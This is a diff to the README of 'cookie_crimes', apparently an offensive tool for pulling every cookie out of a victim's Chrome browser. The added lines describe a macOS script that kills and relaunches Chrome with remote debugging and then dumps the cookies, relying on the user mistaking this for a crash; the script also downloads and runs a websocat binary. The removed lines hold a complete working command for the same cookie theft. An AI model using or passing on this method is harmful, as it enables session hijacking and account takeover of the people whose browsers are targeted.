@@ -29,6 +29,7 @@ Requires Python3.6+ to run locally, but the binary it compiles to works anywhere
 
 ## Usage
 
+### Windows and Linux
 To run it locally:
 ```
    python cookie_crimes.py
@@ -41,6 +42,28 @@ To compile to a single binary:
 ```
 
 Note that the binary created will be for the OS you run `make` on. There's no fancy cross-compiling magic going on here. You'll have to build this on the same OS as you're running it on.
+
+### macOS
+
+For whatever reason, running Chrome with `--headless` has allowed reading of cookies from headful Chrome on-and-off over the last few years as changes to Chrome are made. This has caused the `headless` method to sometimes not work on macOS. 
+Instead, you can run:
+```
+./cookie_crimes_macos.sh
+```
+
+##### Formatting for EditThisCookie
+Chrome's cookie format stores domains with leading dots (e.g. `.google.com`), and so to import _all_ cookies into Chrome via the EditThisCookie Chrome Extension, you'll need to remove the leading dots. You can do this via the following Enterprise Grade bash script:
+
+```
+cat cookies.json | ./format_for_editthiscookie.sh
+```
+
+##### How it works
+It works by quickly killing and restarting Chrome, and attaching remote debugging to the new Chrome session with `--restore-last-session`. This does have the downside of making the Chrome window look like it crashed for about 0.5s (it did lol) and reloading all tabs. But hey, the user will probably just assume their Chrome crashed and restored itself.
+
+Extra crispy thanks to [@IAmMandatory](https://twitter.com/iammandatory) for sharing this trick `<3`
+
+`cookie_crimes_macos.sh` will also download, execute, and delete a [websocat](https://github.com/vi/websocat) binary to make the websocket request.
 
 ### Multiple Profiles
 If you want to extract the Chrome cookies for a profile other than the Default profile, just edit the `PROFILE` variable in `cookie_crimes.py`. This uses some sneaky "writing to `/tmp`" tricks to trick Chrome into reading the cookies for us.
@@ -55,26 +78,6 @@ From here, we just use a normal (but extremely forbidden and undocumented) featu
 
 You can fully control Chrome at this point, taking any action the user could take.
 
-### UPDATE: Alternate method for macOS
-For whatever reason, running Chrome with `--headless` has allowed reading of cookies from headful Chrome on-and-off over the last few years as changes to Chrome are made. This has caused the `headless` method to sometimes not work on macOS. 
-
-Here's an alternate method that works cross-platform, first time, every time.
-
-```
-pkill Chrome && while pgrep Chrome; do false; done; /Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \ # Or the Chrome binary location on Windows/Linux
---user-data-dir="$HOME/Library/Application Support/Google/Chrome" \ # Or the user-data-dir on Windows/Linux
---remote-debugging-port=9222 --crash-dumps-dir=/tmp --restore-last-session & \
- sleep 5 && echo 'Network.getAllCookies' | \
-websocat -n1 --jsonrpc \
-$(curl -sg http://localhost:9222/json | grep webSocketDebuggerUrl | cut -d'"' -f4 | head -1)
-```
-
-If you don't have `websocat` installed, you can do the websocket request in `python`, as the example in `cookie_crimes.py` does.
-
-##### How it works
-It works by quickly killing and restarting Chrome, and attaching remote debugging to the new Chrome session with `--restore-last-session`. This does have the downside of making the Chrome window look like it crashed for about 0.5s (it did lol) and reloading all tabs. But hey, the user will probably just assume their Chrome crashed and restored itself.
-
-Extra crispy thanks to [@IAmMandatory](https://twitter.com/iammandatory) for sharing this trick `<3`
 
 ### closing ceremony
 don't do crimes with this please
